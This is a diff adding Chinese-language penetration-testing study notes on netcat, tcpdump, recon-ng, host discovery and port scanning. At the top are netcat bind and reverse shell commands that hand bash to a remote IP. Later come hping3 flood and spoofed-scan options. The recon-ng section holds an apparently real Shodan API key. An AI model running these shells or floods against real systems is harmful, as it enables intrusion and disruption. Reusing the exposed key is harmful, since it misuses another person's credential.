@@ -1,0 +1,146 @@
+nc：
+	nc -lp 333 -c bash
+	nc IP 333
+
+	nc -lp 333
+	nc IP 333 -c bash
+ncat
+	ncat -c bash --allow IP -vnl 333 --ssl
+	ncat -nv IP 333 --ssl
+wireshark
+	Egine:
+		linux:libpcap
+		windows:wincap
+tcpdump
+	default:68bytes
+	-w file
+	-i	eth0
+	-s 0表示all
+	-r a.cap表示读取
+	-A first args，ascii
+	-X 十进制显示
+	tcp port 22
+	-n ip print
+	-n src host ipaddr
+	-n dest host ipaddr
+高级筛选示例：
+	tcpdump -A -n 'tcp[13]=24' ,24表示flag位的十进制表示法
+
+dradis
+	可以导入扫描工具的日志文件，进行分析
+信息收集：
+	被动信息采集：
+		DNS:ptr反向域名解析,解析到不同的ip地址，智能dns
+			nslookup：
+				server
+				set type|q=a|mx|ptr|ns|any|spf
+				spf发垃圾邮件，
+			nslookup -q=any sina.com 114.114.114.114
+字典生成：
+	cupp:https://github.com/Mebus/cupp.git
+图像信息：
+	exiftool 
+recon-ng
+	重量级工具，全特性的web侦查框架
+	完整的被动收集的工具框架，包含所有的任务
+	使用方法：
+		模快
+		数据库	
+		报告
+	全局选项：
+		help 帮助
+		shodanAPI:L26qAhWndDe4xLP9dh9DwswYcWXBSknN
+		-w workspace,生成一个工作区
+		-r load from resource file
+	>workspace list
+	>keys add shodan_api 
+	>search
+	>set 
+	>show options
+	>set USER_AGENT   || unset USER_AGENT
+	>show schema
+	>run
+	>brute
+	>search resolve
+	>set SOURCE query select host from hosts
+二层发现：
+	arping:
+		可查看mac地址
+		-c 1
+		-d 查找网络中arp欺骗的ip
+	nmap:
+		-sn host discovery,同时会反向dns解析 -n
+		-iL list simply hosts
+	netdiscover
+		-i device
+		-r range
+		-p passive mode，not send anything
+		-l file
+		netdiscover -i eth0 -r 192.168.10.0/24
+		netdiscover -p
+	scapy
+		python，网络数据包分析工具，创建，修改，重放
+	>>>ARP()
+	>>>ARP()display()
+	>>>arp=ARP()
+	>>>arp.pdst="192.168.10.1"
+	>>>sr1(arp,timeout=1,verbose=1)
+	>>>answer=sr1(arp)
+	>>>answer.display()
+三层发现，ip，icmp
+	traceroute
+	ping -R 
+	scapy	
+		i=IP()
+		p=ICMP()
+		ping=(i/ip)
+		ping[IP].dst
+		sr1(IP(dst="")/ICMP())
+	nmap
+		nmap -sn
+	fping
+		-c 1
+		-g 192.168.10.0/24 | 192.168.10.1 192.168.10.100
+	hping
+		只能扫描一个主机
+		hping ip -icmp -c 2
+四层发现：
+	scapy
+	sr1(IP(dst="")/TCP(dport=80,flags="A"),timeout=1))
+	
+	nmap:
+		-PS/PA/PU -sn SYN ACK UDP discovery
+		nmap IP -PS/PS/PA/PU[PORT] -sn
+	hping3:
+		only package
+		-a --rand-source
+		--flood --fast
+		--udp(-2) -c 1 udp四层发现
+端口扫描
+	scan techniques
+	udp扫描：
+		-sU UDP scan
+		-sS 
+	tcp扫描：
+		sr1(IP(dst="")/TCP(flag="S", dport=22),timeout=1)
+		三次握手状态变换端口扫描
+		隐蔽扫描：
+			syn包
+			-sS
+		僵尸扫描：
+			实施条件苛刻
+			DDOS一般为真实地址，边界路由器添加策略
+			僵尸机：闲置系统，IPID递增（linux随机)
+			
+	hping
+		hping3 -c 10 -S --spoof -p ++1 --scan 1-100  IP
+		
+	dmitry:
+		dmitry -p 
+	nc
+		nc -nv -w 1 -z IP 1-100
+服务扫描：
+	/usr/share/nmap/script/
+	--script=
+	-B banner信息发现
+	-sV 服务发现		
